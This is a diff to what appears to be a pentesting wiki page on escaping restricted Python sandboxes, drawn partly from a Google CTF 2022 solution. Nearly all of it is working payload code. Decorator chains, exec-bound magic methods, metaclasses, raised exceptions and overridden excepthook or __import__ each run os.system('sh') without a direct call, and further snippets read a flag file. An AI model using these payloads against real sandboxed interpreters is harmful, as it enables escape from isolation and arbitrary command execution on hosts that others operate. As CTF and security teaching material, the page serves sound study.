@@ -136,61 +136,147 @@ exec(__import__('base64').b64decode('X19pbXBvcnRfXygnb3MnKS5zeXN0ZW0oJ2xzJyk='))
 
 If you are inside a python jail that **doesn't allow to make calls**, there are still some ways to **execute arbitrary functions, code** and **commands**.
 
-### RCE with @eval
+### RCE with [decorators](https://docs.python.org/3/glossary.html#term-decorator)
 
 ```python
+# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
+@exec
+@input
+class X:
+    pass
+
+# The previous code is equivalent to:
+class X:
+    pass
+X = input(X)
+X = exec(X)
+
+# So just send your python code when promped and it will be executed
+
+
+# Another approach without calling input:
 @eval
 @'__import__("os").system("sh")'.format
 class _:pass
 ```
 
-### RCE Declaring exceptions
+### RCE creating objects and overloading
+
+If you can **declare a class** and **create and object** of that class you could **write/overwrite different methods** that can be **triggered** **without** **needing to call them directly**.
+
+#### RCE with custom classes
+
+You can modify some **class methods** (_by overwriting existing class methods or creating a new class_) to make them **execute arbitrary code** when **triggered** without calling them directly.
 
 ```python
-# Declare arbitrary exception class
+# This class has 3 different was to trigger RCE without directly calling any function
+class RCE:
+    def __init__(self):
+        self += "print('Hello from __iadd__')"
+    __iadd__ = exec #Triggered when object is created
+    __getitem__ = exec #Trigerred with obj[<argument>]
+    __add__ = exec #Triggered with obj + <argument>
+
+rce = RCE()
+rce["print('Hello from __getitem__')"]
+rce + "print('Hello from __add__')"
+
+# Other
+__sub__ (k - 'import os; os.system("sh")')
+__mul__ (k * 'import os; os.system("sh")')
+__floordiv__ (k // 'import os; os.system("sh")')
+__truediv__ (k / 'import os; os.system("sh")')
+__mod__ (k % 'import os; os.system("sh")')
+__pow__ (k**'import os; os.system("sh")')
+__lt__ (k < 'import os; os.system("sh")')
+__le__ (k <= 'import os; os.system("sh")')
+__eq__ (k == 'import os; os.system("sh")')
+__ne__ (k != 'import os; os.system("sh")')
+__ge__ (k >= 'import os; os.system("sh")')
+__gt__ (k > 'import os; os.system("sh")')
+__iadd__ (k += 'import os; os.system("sh")')
+__isub__ (k -= 'import os; os.system("sh")')
+__imul__ (k *= 'import os; os.system("sh")')
+__ifloordiv__ (k //= 'import os; os.system("sh")')
+__idiv__ (k /= 'import os; os.system("sh")')
+__itruediv__ (k /= 'import os; os.system("sh")') (Note that this only works when from __future__ import division is in effect.)
+__imod__ (k %= 'import os; os.system("sh")')
+__ipow__ (k **= 'import os; os.system("sh")')
+__ilshift__ (k<<= 'import os; os.system("sh")')
+__irshift__ (k >>= 'import os; os.system("sh")')
+__iand__ (k = 'import os; os.system("sh")')
+__ior__ (k |= 'import os; os.system("sh")')
+__ixor__ (k ^= 'import os; os.system("sh")')
+```
+
+#### Crating objects with [metaclasses](https://docs.python.org/3/reference/datamodel.html#metaclasses)
+
+The key thing that metaclasses allow us to do is **make an instance of a class, without calling the constructor** directly, by creating a new class with the target class as metaclass.
+
+```python
+# Code from https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/ and fixed
+# This will define the members on the "sub"class
+class Metaclass(type):
+    __getitem__ = exec # So Sub[string] will execute exec(string)
+# Note: Metaclass.__class__ == type
+    
+class Sub(metaclass=Metaclass): # That's how we make Sub.__class__ == Metaclass
+    pass # Nothing special to do
+
+Sub['import os; os.system("sh")']
+
+## You can also use the tricks from the previous section to get RCE with this object
+```
+
+#### Creating objects with exceptions
+
+When an **exception is triggered** an object of the **Exception** is **created** without you needing to call the constructor directly (trick from [**@\_nag0mez**](https://mobile.twitter.com/\_nag0mez)):
+
+```python
+class RCE(Exception):
+    def __init__(self):
+        self += 'import os; os.system("sh")'
+    __iadd__ = exec #Triggered when object is created
+raise RCE #Generate RCE object
+
+
+# RCE with __add__ overloading and try/except + raise generacted object
 class Klecko(Exception):
-  def __add__(self,algo):
-    return 1
+  __add__ = exec
 
-# Change add function
-Klecko.__add__ = os.system #os is already imported
-
-# Generate an object of the class with a try/except + raise
-## Trick from @_nag0mez
 try:
   raise Klecko
 except Klecko as k:
-  k + "/bin/bash -i" #RCE abusing __add__
-
-## Same can be done with other magic methods, such as 
-__sub__ (k - "/bin/bash -i")
-__mul__ (k * "/bin/bash -i")
-__floordiv__ (k // "/bin/bash -i")
-__truediv__ (k / "/bin/bash -i")
-__mod__ (k % "/bin/bash -i")
-__pow__ (k**"/bin/bash -i")
-__lt__ (k < "/bin/bash -i")
-__le__ (k <= "/bin/bash -i")
-__eq__ (k == "/bin/bash -i")
-__ne__ (k != "/bin/bash -i")
-__ge__ (k >= "/bin/bash -i")
-__gt__ (k > "/bin/bash -i")
-__iadd__ (k += "/bin/bash -i")
-__isub__ (k -= "/bin/bash -i")
-__imul__ (k *= "/bin/bash -i")
-__ifloordiv__ (k //= "/bin/bash -i")
-__idiv__ (k /= "/bin/bash -i")
-__itruediv__ (k /= "/bin/bash -i") (Note that this only works when from __future__ import division is in effect.)
-__imod__ (k %= "/bin/bash -i")
-__ipow__ (k **= "/bin/bash -i")
-__ilshift__ (k<<= "/bin/bash -i")
-__irshift__ (k >>= "/bin/bash -i")
-__iand__ (k = "/bin/bash -i")
-__ior__ (k |= "/bin/bash -i")
-__ixor__ (k ^= "/bin/bash -i")
+  k + 'import os; os.system("sh")' #RCE abusing __add__
+  
+## You can also use the tricks from the previous section to get RCE with this object
 ```
 
-### Read file with builtins help
+### More RCE
+
+```python
+# From https://ur4ndom.dev/posts/2022-07-04-gctf-treebox/
+# If sys is imported, you can sys.excepthook and trigger it by triggering an error
+class X:
+    def __init__(self, a, b, c):
+        self += "os.system('sh')"
+    __iadd__ = exec
+sys.excepthook = X
+1/0 #Trigger it
+
+# From https://github.com/google/google-ctf/blob/master/2022/sandbox-treebox/healthcheck/solution.py
+# The interpreter will try to import an apt-specific module to potentially 
+# report an error in ubuntu-provided modules.
+# Therefore the __import__ functions is overwritten with our RCE
+class X():
+  def __init__(self, a, b, c, d, e):
+    self += "print(open('flag').read())"
+  __iadd__ = eval
+__builtins__.__import__ = X
+{}[1337]
+```
+
+### Read file with builtins help & license
 
 ```python
 __builtins__.__dict__["license"]._Printer__filenames=["flag"]
